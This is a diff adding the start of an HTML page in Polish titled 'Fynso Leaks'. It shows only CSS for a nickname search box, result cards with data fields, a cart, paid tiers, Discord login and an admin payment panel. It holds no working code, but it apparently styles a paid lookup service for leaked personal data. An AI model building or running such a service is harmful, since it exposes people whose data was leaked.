@@ -1,0 +1,2511 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fynso Leaks</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;900&family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg-base: #f3f3f5;
+      --bg-surface: #ffffff;
+      --bg-elevated: #f8f9fa;
+      --bg-card: #ffffff;
+      --bg-input: #ffffff;
+      --border: #e2e8f0;
+      --border-focus: #1a1e24;
+      --accent: #1a1e24;
+      --accent-hover: #333333;
+      --text-primary: #1a1e24;
+      --text-secondary: #555555;
+      --text-muted: #777777;
+      --radius-sm: 8px;
+      --radius-md: 12px;
+      --radius-lg: 18px;
+      --radius-xl: 50px;
+      --shadow-md: 0 4px 15px rgba(0, 0, 0, 0.05);
+      --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.08);
+      --transition: 0.22s cubic-bezier(0.4, 0, 0.2, 1);
+      --danger: #ef4444;
+      --danger-bg: rgba(239, 68, 68, 0.1);
+      --success: #22c55e;
+      --discord: #5865F2;
+      --discord-hover: #4752C4;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: var(--bg-base);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* ---- FIOLETOWA POŚWIATA KURSORA ---- */
+    .cursor-glow {
+      position: fixed;
+      width: 45px;
+      height: 45px;
+      background: rgba(168, 85, 247, 0.35);
+      border-radius: 50%;
+      pointer-events: none;
+      transform: translate(-50%, -50%);
+      z-index: 99999;
+      mix-blend-mode: multiply;
+      filter: blur(12px);
+      transition: transform 0.05s linear;
+      display: none;
+    }
+
+    /* ---- ŚNIEG I PŁATKI ---- */
+    .snow-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 5;
+    }
+
+    .snowflake {
+      position: absolute;
+      top: -20px;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 0 6px rgba(255, 255, 255, 0.9);
+      animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+      0% {
+        transform: translateY(0) translateX(0) rotate(0deg);
+        opacity: 0;
+      }
+      8% { opacity: 0.9; }
+      92% { opacity: 0.9; }
+      100% {
+        transform: translateY(105vh) translateX(120px) rotate(540deg);
+        opacity: 0;
+      }
+    }
+
+    .snowflake:nth-child(3n+1) { background: #ffb7c5; border-radius: 12px 0px 12px 6px; box-shadow: none; }
+    .snowflake:nth-child(1) { left: 3%; width: 6px; height: 6px; animation-duration: 5s; animation-delay: 0s; }
+    .snowflake:nth-child(2) { left: 7%; width: 9px; height: 9px; animation-duration: 8s; animation-delay: 1.5s; }
+    .snowflake:nth-child(3) { left: 12%; width: 5px; height: 5px; animation-duration: 4.5s; animation-delay: 0.3s; }
+    .snowflake:nth-child(4) { left: 18%; width: 8px; height: 8px; animation-duration: 7s; animation-delay: 2.2s; }
+    .snowflake:nth-child(5) { left: 24%; width: 6px; height: 6px; animation-duration: 6.5s; animation-delay: 0.7s; }
+    .snowflake:nth-child(6) { left: 30%; width: 10px; height: 7px; animation-duration: 9s; animation-delay: 3.1s; }
+    .snowflake:nth-child(7) { left: 36%; width: 5px; height: 5px; animation-duration: 5.5s; animation-delay: 1.1s; }
+    .snowflake:nth-child(8) { left: 42%; width: 9px; height: 9px; animation-duration: 7.5s; animation-delay: 0.2s; }
+    .snowflake:nth-child(9) { left: 48%; width: 6px; height: 6px; animation-duration: 4s; animation-delay: 2.8s; }
+    .snowflake:nth-child(10) { left: 54%; width: 8px; height: 8px; animation-duration: 8.5s; animation-delay: 1.9s; }
+    .snowflake:nth-child(11) { left: 60%; width: 5px; height: 5px; animation-duration: 6s; animation-delay: 0.4s; }
+    .snowflake:nth-child(12) { left: 66%; width: 9px; height: 9px; animation-duration: 7.2s; animation-delay: 3.5s; }
+    .snowflake:nth-child(13) { left: 72%; width: 6px; height: 6px; animation-duration: 5.2s; animation-delay: 1.6s; }
+    .snowflake:nth-child(14) { left: 78%; width: 10px; height: 8px; animation-duration: 8.8s; animation-delay: 0.1s; }
+    .snowflake:nth-child(15) { left: 84%; width: 5px; height: 5px; animation-duration: 4.8s; animation-delay: 2.4s; }
+    .snowflake:nth-child(16) { left: 90%; width: 8px; height: 8px; animation-duration: 6.8s; animation-delay: 3.9s; }
+    .snowflake:nth-child(17) { left: 95%; width: 6px; height: 6px; animation-duration: 5.9s; animation-delay: 0.8s; }
+
+    /* ---- DRZEWA W ROGACH ---- */
+    .branch-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    .branch {
+      position: absolute;
+      width: 520px; 
+      height: 380px; 
+      top: 0;
+    }
+    
+    .branch-left { left: -40px; }
+    .branch-right { right: -40px; transform: scaleX(-1); }
+
+    .admin-control-panel {
+      position: fixed;
+      right: 20px;
+      top: 120px;
+      width: 330px;
+      background: rgba(255,255,255,0.95);
+      border: 1px solid rgba(26,30,36,0.08);
+      border-radius: 24px;
+      box-shadow: 0 24px 55px rgba(0,0,0,0.08);
+      padding: 18px;
+      z-index: 1200;
+      backdrop-filter: blur(10px);
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .admin-panel-title {
+      font-size: 1rem;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--text-primary);
+    }
+
+    .admin-panel-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .admin-profile-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .admin-profile-avatar {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--discord);
+    }
+
+    .admin-profile-name {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .admin-profile-name strong {
+      font-size: 0.95rem;
+      color: var(--text-primary);
+    }
+
+    .admin-profile-name span {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    .admin-plan-label {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--accent);
+      text-transform: uppercase;
+    }
+
+    .admin-slider-group {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 14px;
+      align-items: center;
+    }
+
+    .admin-slider-info {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      font-size: 0.86rem;
+      color: var(--text-secondary);
+    }
+
+    .admin-slider-info strong {
+      color: var(--text-primary);
+      font-size: 0.95rem;
+    }
+
+    .admin-slider-wrap {
+      position: relative;
+      height: 200px;
+      width: 40px;
+      background: rgba(26, 30, 36, 0.05);
+      border-radius: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px 0;
+    }
+
+    .admin-slider {
+      appearance: none;
+      -webkit-appearance: none;
+      width: 180px;
+      transform: rotate(-90deg);
+      position: absolute;
+      top: calc(50% - 9px);
+      left: calc(50% - 90px);
+      height: 18px;
+      background: transparent;
+    }
+
+    .admin-slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: var(--accent);
+      border: 3px solid white;
+      box-shadow: 0 8px 18px rgba(0,0,0,0.12);
+      cursor: pointer;
+    }
+
+    .admin-slider::-moz-range-thumb {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: var(--accent);
+      border: 3px solid white;
+      cursor: pointer;
+      box-shadow: 0 8px 18px rgba(0,0,0,0.12);
+    }
+
+    .admin-panel-actions {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+    }
+
+    .admin-panel-actions button {
+      border: none;
+      border-radius: var(--radius-md);
+      padding: 0.85rem 0.9rem;
+      cursor: pointer;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      transition: background var(--transition), transform var(--transition);
+    }
+
+    .admin-control-user-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(26,30,36,0.08);
+    }
+
+    .admin-control-user-item {
+      display: grid;
+      grid-template-columns: auto 1fr auto;
+      gap: 12px;
+      align-items: center;
+      padding: 12px;
+      background: rgba(99,102,241,0.05);
+      border-radius: 16px;
+      border: 1px solid rgba(99,102,241,0.12);
+    }
+
+    .admin-control-user-item img {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 1px solid rgba(255,255,255,0.8);
+    }
+
+    .admin-control-user-item span {
+      font-size: 0.82rem;
+      color: var(--text-primary);
+    }
+
+    .admin-control-user-actions {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .admin-control-user-actions button {
+      border: none;
+      border-radius: 999px;
+      padding: 0.35rem 0.75rem;
+      font-size: 0.72rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform var(--transition);
+    }
+
+    .admin-control-user-actions button:hover {
+      transform: translateY(-1px);
+    }
+
+    .admin-control-user-actions .btn-small-free { background: rgba(34,197,94,0.12); color: #166534; }
+    .admin-control-user-actions .btn-small-medium { background: rgba(59,130,246,0.12); color: #1d4ed8; }
+    .admin-control-user-actions .btn-small-pro { background: rgba(168,85,247,0.12); color: #6d28d9; }
+
+    .admin-control-empty {
+      font-size: 0.82rem;
+      color: var(--text-secondary);
+      padding: 10px 0 0;
+    }
+
+    .admin-btn-set {
+      background: var(--discord);
+      color: white;
+    }
+
+    .admin-btn-remove {
+      background: #ef4444;
+      color: white;
+    }
+
+    .admin-btn-set:hover,
+    .admin-btn-remove:hover {
+      transform: translateY(-1px);
+    }
+
+    @media (max-width: 900px) {
+      .admin-control-panel {
+        display: none;
+      }
+    }
+
+    @media (max-width: 1200px) {
+      .branch { width: 400px; height: 300px; }
+    }
+    @media (max-width: 768px) {
+      .branch { width: 280px; height: 210px; }
+    }
+
+    /* HEADER & NAVIGATION */
+    .navbar {
+      width: 100%;
+      text-align: center;
+      padding-top: 55px;
+      z-index: 100;
+    }
+
+    .navbar-inner {
+      max-width: 1000px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 25px;
+    }
+
+    .navbar-brand {
+      font-family: 'Cinzel', serif;
+      font-size: 3.8rem;
+      font-weight: 900;
+      letter-spacing: 3px;
+      color: #161b22;
+      text-decoration: none;
+      text-transform: uppercase;
+      text-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+    }
+
+    .nav-tabs {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      list-style: none;
+    }
+
+    .nav-tab-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #1a1e24;
+      letter-spacing: 1px;
+      padding: 5px 2px;
+      text-transform: uppercase;
+      transition: color var(--transition);
+    }
+
+    .nav-tab-btn:hover, .nav-tab-btn.active { color: #666; }
+
+    /* MAIN */
+    .main {
+      flex: 1;
+      width: 100%;
+      max-width: 1000px;
+      padding: 5rem 1.5rem 3rem;
+      z-index: 10;
+    }
+
+    .view {
+      display: none;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .view.active { display: block; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* SEARCH HERO SYSTEM */
+    .search-hero {
+      text-align: center;
+      margin-bottom: 2rem;
+      position: relative;
+      max-width: 620px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* KOSZYK ZAKUPOWY - PO LEWEJ STRONIE */
+    .cart-wrapper {
+      position: absolute;
+      top: -45px;
+      left: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-cart {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 50%;
+      width: 42px;
+      height: 42px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: var(--text-primary);
+      box-shadow: var(--shadow-md);
+      transition: all var(--transition);
+      position: relative;
+    }
+
+    .btn-cart:hover {
+      background: var(--bg-elevated);
+      transform: translateY(-2px);
+    }
+
+    .btn-cart svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    .cart-count {
+      position: absolute;
+      top: -4px;
+      right: -4px;
+      background: var(--accent);
+      color: white;
+      font-size: 0.7rem;
+      font-weight: 700;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* BIAŁY PASEK WYSUWANY Z PRAWEJ (SIDEBAR KOSZYKA) */
+    .cart-sidebar {
+      position: fixed;
+      top: 0;
+      right: -350px;
+      width: 350px;
+      height: 100vh;
+      background: var(--bg-surface);
+      box-shadow: -10px 0 30px rgba(0, 0, 0, 0.05);
+      z-index: 2000;
+      transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      flex-direction: column;
+      border-left: 1px solid var(--border);
+    }
+
+    .cart-sidebar.open {
+      right: 0;
+    }
+
+    .cart-sidebar-header {
+      padding: 1.5rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .cart-sidebar-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-close-cart {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-primary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-close-cart svg {
+      width: 24px;
+      height: 24px;
+    }
+
+    .cart-sidebar-content {
+      flex-grow: 1;
+      padding: 1.5rem;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .cart-empty-msg {
+      color: var(--text-muted);
+      text-align: center;
+      margin-top: 2rem;
+      font-size: 0.9rem;
+    }
+
+    .cart-item {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .cart-item-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .cart-item-name {
+      font-weight: 700;
+      font-size: 0.95rem;
+      text-transform: uppercase;
+    }
+
+    .cart-item-price {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+    }
+
+    .btn-remove-item {
+      background: none;
+      border: none;
+      color: var(--danger);
+      cursor: pointer;
+      padding: 4px;
+    }
+
+    /* PASEK Z PRZYCISKIEM KUP NA DOLE */
+    .cart-sidebar-footer {
+      padding: 1.5rem;
+      border-top: 1px solid var(--border);
+      background: var(--bg-elevated);
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .cart-total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-weight: 700;
+      font-size: 1.05rem;
+    }
+
+    .btn-checkout {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: var(--radius-md);
+      font-family: inherit;
+      font-weight: 700;
+      font-size: 0.95rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      transition: background var(--transition);
+      text-align: center;
+    }
+
+    .btn-checkout:hover {
+      background: var(--accent-hover);
+    }
+
+    /* PRZYCIEMNIENIE TŁA PRZY OTWARTYM KOSZYKU */
+    .sidebar-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.15);
+      backdrop-filter: blur(2px);
+      z-index: 1999;
+      display: none;
+    }
+
+    .sidebar-overlay.show {
+      display: block;
+    }
+
+    .search-box-wrapper {
+      position: relative;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .search-input-container {
+      position: relative;
+      flex-grow: 1;
+    }
+
+    .search-input {
+      width: 100%;
+      padding: 18px 120px 18px 60px;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: var(--radius-xl);
+      background-color: var(--bg-input);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.04);
+      outline: none;
+      color: #222;
+      transition: box-shadow var(--transition);
+    }
+
+    .search-input:focus { box-shadow: 0 6px 25px rgba(0, 0, 0, 0.07); }
+
+    .search-field-icon {
+      position: absolute;
+      left: 24px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 22px;
+      height: 22px;
+      color: #888;
+    }
+
+    .btn-search {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius-xl);
+      padding: 11px 24px;
+      font-family: inherit;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background var(--transition);
+    }
+
+    .btn-search:hover { background: var(--accent-hover); }
+
+    .btn-discord {
+      background: var(--discord);
+      border: none;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      min-width: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: white;
+      box-shadow: 0 6px 20px rgba(88, 101, 242, 0.2);
+      transition: all var(--transition);
+    }
+
+    .btn-discord:hover {
+      background: var(--discord-hover);
+      transform: scale(1.05);
+    }
+
+    .btn-discord svg {
+      width: 24px;
+      height: 24px;
+      fill: currentColor;
+    }
+
+    .search-subtitle {
+      font-size: 0.85rem;
+      letter-spacing: 1.5px;
+      color: #222;
+      font-weight: 700;
+      text-transform: uppercase;
+      margin-top: 15px;
+    }
+
+    .discord-auth-card {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .btn-discord-auth {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px 18px;
+      border: none;
+      border-radius: var(--radius-xl);
+      background: linear-gradient(135deg, var(--discord), #8b9dff);
+      color: white;
+      font-family: inherit;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(88, 101, 242, 0.2);
+      transition: transform var(--transition), box-shadow var(--transition);
+    }
+
+    .btn-discord-auth:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 10px 24px rgba(88, 101, 242, 0.28);
+    }
+
+    .btn-discord-auth svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+
+    .discord-user-card {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      background: rgba(255, 255, 255, 0.75);
+      box-shadow: var(--shadow-md);
+    }
+
+    .discord-user-card.hidden {
+      display: none;
+    }
+
+    .discord-avatar {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--discord);
+    }
+
+    .discord-user-meta {
+      display: flex;
+      flex-direction: column;
+      text-align: left;
+    }
+
+    .discord-user-name {
+      font-size: 0.95rem;
+      font-weight: 700;
+    }
+
+    .discord-user-label {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+
+    .license-info {
+      color: #444;
+      font-size: 0.95rem;
+      margin-top: 0.6rem;
+      letter-spacing: 0.02em;
+    }
+    .license-info span {
+      font-weight: 700;
+    }
+
+    .discord-logout-btn {
+      border: none;
+      background: none;
+      cursor: pointer;
+      color: var(--text-secondary);
+      font-weight: 600;
+      margin-left: 6px;
+    }
+
+    .admin-panel-card {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .admin-panel-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .admin-panel-header h3 {
+      font-size: 1.1rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 0.3rem;
+    }
+
+    .admin-panel-header p {
+      color: var(--text-secondary);
+      font-size: 0.92rem;
+    }
+
+    .admin-badge {
+      padding: 0.45rem 0.8rem;
+      border-radius: var(--radius-xl);
+      background: var(--accent);
+      color: white;
+      font-size: 0.8rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    .admin-panel-actions {
+      display: flex;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    .admin-user-list {
+      display: flex;
+      flex-direction: column;
+      gap: 0.85rem;
+    }
+
+    .admin-user-item {
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      flex-wrap: wrap;
+      background: var(--bg-elevated);
+    }
+
+    .admin-user-main {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      min-width: 220px;
+    }
+
+    .admin-user-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--discord);
+    }
+
+    .admin-user-name {
+      font-weight: 700;
+    }
+
+    .admin-user-meta {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+    }
+
+    .admin-status {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0.3rem 0.7rem;
+      border-radius: var(--radius-xl);
+      font-size: 0.78rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .admin-status.pending {
+      background: rgba(245, 158, 11, 0.14);
+      color: #b45309;
+    }
+
+    .admin-status.paid {
+      background: rgba(34, 197, 94, 0.14);
+      color: #15803d;
+    }
+
+    .admin-status.approved {
+      background: rgba(59, 130, 246, 0.14);
+      color: #1d4ed8;
+    }
+
+    .admin-status.rejected {
+      background: rgba(239, 68, 68, 0.14);
+      color: #b91c1c;
+    }
+
+    .admin-user-actions {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+
+    .admin-user-actions button {
+      border: none;
+      border-radius: var(--radius-md);
+      padding: 0.4rem 0.7rem;
+      font-family: inherit;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 0.8rem;
+    }
+
+    .admin-btn-paid {
+      background: rgba(34, 197, 94, 0.14);
+      color: #15803d;
+    }
+
+    .admin-btn-approve {
+      background: rgba(59, 130, 246, 0.14);
+      color: #1d4ed8;
+    }
+
+    .admin-btn-reject {
+      background: rgba(239, 68, 68, 0.14);
+      color: #b91c1c;
+    }
+
+    /* INTERFACES & CARDS */
+    .result-section {
+      max-width: 620px;
+      margin: 0 auto 4rem;
+      scroll-margin-top: 30px;
+    }
+
+    .result-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow: var(--shadow-lg);
+    }
+
+    .result-card-header {
+      padding: 1.25rem 1.75rem;
+      background: rgba(0, 0, 0, 0.01);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .result-card-header .avatar {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: var(--accent);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .result-card-header .result-nick { font-size: 1.15rem; font-weight: 700; }
+    .result-card-body { padding: 1.5rem 1.75rem; display: flex; flex-direction: column; gap: 1rem; }
+    .data-row { display: flex; flex-direction: column; gap: 4px; }
+    .data-label { font-size: 0.75rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+    
+    .data-value {
+      font-size: 0.95rem;
+      font-weight: 500;
+      background: var(--bg-elevated);
+      padding: 0.6rem 0.9rem;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border);
+      font-family: monospace;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .error-card {
+      background: var(--danger-bg);
+      border: 1px solid rgba(239, 68, 68, 0.2);
+      border-radius: var(--radius-lg);
+      padding: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .error-title { font-weight: 600; color: var(--danger); }
+
+    /* ---- DŁUGIE PAKIETY / CENNIK ---- */
+    .pricing-title {
+      text-align: center;
+      font-size: 1.4rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 2rem;
+      color: var(--text-primary);
+    }
+
+    .pricing-container {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 25px;
+      max-width: 960px;
+      margin: 0 auto;
+    }
+
+    .price-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 3rem 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: var(--shadow-md);
+      position: relative;
+      transition: transform var(--transition), box-shadow var(--transition);
+    }
+
+    .price-card:hover {
+      transform: translateY(-4px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    .price-card.featured {
+      border: 2px solid var(--accent);
+    }
+
+    .price-badge {
+      position: absolute;
+      top: 15px;
+      background: #e2e8f0;
+      color: var(--text-primary);
+      font-size: 0.7rem;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: var(--radius-xl);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .price-badge.active-badge {
+      background: var(--success);
+      color: white;
+    }
+
+    .price-name {
+      font-size: 1.5rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 0.5rem;
+      margin-top: 10px;
+    }
+
+    .price-cost {
+      font-size: 2.2rem;
+      font-weight: 900;
+      margin-bottom: 2rem;
+    }
+
+    .price-cost span {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-muted);
+    }
+
+    .price-features {
+      list-style: none;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      margin-bottom: 3rem;
+      flex-grow: 1;
+    }
+
+    .price-features li {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      text-align: center;
+      border-bottom: 1px solid rgba(0,0,0,0.04);
+      padding-bottom: 8px;
+    }
+
+    .price-features li strong {
+      color: var(--text-primary);
+      font-weight: 700;
+    }
+
+    .btn-price {
+      width: 100%;
+      padding: 12px;
+      border-radius: var(--radius-md);
+      border: 1px solid var(--border);
+      background: var(--bg-elevated);
+      font-family: inherit;
+      font-weight: 600;
+      font-size: 0.9rem;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      transition: all var(--transition);
+    }
+
+    .price-card.featured .btn-price {
+      background: var(--accent);
+      color: white;
+      border: none;
+    }
+
+    .btn-price:hover {
+      background: var(--accent-hover);
+      color: white;
+    }
+
+    @media (max-width: 900px) {
+      .pricing-container { grid-template-columns: 1fr; }
+      .price-card { padding: 2.5rem 2rem; }
+    }
+
+    /* CARD PANELS FOR IMPORT */
+    .card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: 2rem;
+      box-shadow: var(--shadow-md);
+    }
+
+    .import-textarea {
+      width: 100%;
+      min-height: 250px;
+      padding: 1rem;
+      font-family: monospace;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      outline: none;
+      resize: vertical;
+    }
+
+    .import-actions { margin-top: 1rem; display: flex; gap: 1rem; }
+    .btn-primary { background: var(--accent); color: white; border: none; padding: 0.75rem 1.5rem; font-weight: 600; border-radius: var(--radius-md); cursor: pointer; }
+    .btn-danger { background: transparent; color: var(--danger); border: 1px solid var(--danger); padding: 0.75rem 1.5rem; font-weight: 600; border-radius: var(--radius-md); cursor: pointer; }
+
+    /* TOAST ALERT */
+    .toast {
+      position: fixed;
+      bottom: 2rem;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: white;
+      border: 1px solid var(--border);
+      padding: 0.7rem 1.5rem;
+      border-radius: var(--radius-md);
+      box-shadow: var(--shadow-lg);
+      opacity: 0;
+      transition: 0.3s ease;
+      z-index: 9999;
+      display: flex;
+      gap: 8px;
+    }
+
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+    /* FOOTER */
+    footer { width: 100%; text-align: center; padding: 40px 20px; font-size: 0.75rem; color: #333; font-weight: 500; letter-spacing: 0.5px; z-index: 10; }
+
+    /* MODAL */
+    .pw-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(6px); z-index: 500; display: flex; align-items: center; justify-content: center; }
+    .pw-overlay.hidden { display: none; }
+    .pw-box { background: white; border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 2rem; width: 360px; text-align: center; box-shadow: var(--shadow-lg); }
+    .pw-input { width: 100%; padding: 0.75rem; margin-bottom: 1rem; text-align: center; border: 1px solid var(--border); border-radius: var(--radius-md); }
+    .pw-actions { display: flex; gap: 10px; }
+    .pw-btn-cancel { flex: 1; background: none; border: 1px solid var(--border); cursor: pointer; border-radius: var(--radius-md); }
+    .pw-btn-ok { flex: 2; background: var(--accent); color: white; border: none; cursor: pointer; border-radius: var(--radius-md); padding: 0.5rem; }
